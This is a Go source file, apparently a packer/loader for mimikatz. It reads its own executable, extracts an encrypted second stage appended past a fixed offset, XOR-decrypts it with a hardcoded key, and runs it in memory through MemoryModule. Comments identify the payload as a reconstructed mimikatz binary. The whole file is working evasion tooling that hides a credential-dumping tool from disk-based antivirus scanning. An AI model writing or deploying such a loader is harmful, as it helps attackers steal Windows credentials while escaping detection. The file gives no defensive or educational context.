package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"fmt"
	"io/ioutil"
	"os"
	"unsafe"
)

const DECRYPT_KEY string = "Qfcuz8e827iggxJ420j1QqnsziQZd5ehfYpC91kmqcCrug9lXtJMUMSQnbDKwwVpR7mdu4PcDdoOfKG9TTZgFHA8xeBhiTN8"
const SIZE int = 2723996

func end(msg string) {
	fmt.Println(msg)
	os.Exit(1)
}

func runCheck(err error, msg string) {
	if err != nil {
		end(msg)
	}
}

func unpack(filename string) []byte {
	//fmt.Printf("Unpacking %s ...\n", filename)
	bin, err := ioutil.ReadFile(filename)
	runCheck(err, "error reading file")
	//fmt.Printf("unpacked %d bytes\n", len(bin))
	stage2 := bin[SIZE:]
	//fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(stage2))
	if len(bin)-SIZE != len(stage2) {
		end("error unpacking failed")
	}

	fmt.Println("Unpacked.")
	return stage2
}

func decrypt(stage2 []byte) []byte {
	key := []byte(DECRYPT_KEY)
	kl := len(key)

	for i := 0; i < len(stage2); i++ {
		stage2[i] = stage2[i] ^ key[i%kl]
	}

	fmt.Println("Decrypted.")
	return stage2
}

func ramExec(stage2 []byte) {
	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the mimikatz reconstructed binary from memory
	handle := C.MemoryLoadLibraryEx(
		unsafe.Pointer(&stage2[0]),                // void *data
		(C.size_t)(len(stage2)),                   // size_t
		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(&cArgs[0]),                 // void *userdata
	)

	// run mimikatz
	C.MemoryCallEntryPoint(handle)

	// cleanup
	C.MemoryFreeLibrary(handle)
}

func main() {
	myself := os.Args[0]
	stage2 := decrypt(unpack(myself))
	fmt.Println("Launching ...")
	ramExec(stage2)
}
